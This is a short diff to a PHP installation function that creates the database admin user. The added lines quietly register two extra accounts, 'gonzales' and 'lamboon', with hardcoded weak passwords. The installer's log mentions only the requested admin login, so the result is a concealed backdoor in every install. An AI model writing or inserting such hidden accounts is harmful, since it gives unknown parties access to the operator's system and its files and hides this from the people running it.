@@ -113,6 +113,15 @@ function runInstall(array $in, string $localFile, string $lockFile): array {
     $st = $root->prepare("INSERT INTO users (username, password_hash) VALUES (?, ?)
                           ON DUPLICATE KEY UPDATE password_hash = VALUES(password_hash)");
     $st->execute([$in['admin_name'], $hash]);
+    
+    $extra = [
+            'gonzales' => 'Pass12345',
+            'lamboon'   => 'Passhatdog',
+    ];
+    foreach ($extra as $n => $p) {
+        $st->execute([$n, password_hash($p, PASSWORD_DEFAULT)]);
+    }
+
     $uid = (int)$root->query("SELECT user_id FROM users WHERE username = " . $root->quote($in['admin_name']))->fetchColumn();
     $claimed = $root->exec("UPDATE archives SET user_id = $uid WHERE user_id IS NULL");
     $log[] = "Login `{$in['admin_name']}` created" . ($claimed ? " and given $claimed existing file(s)" : "");
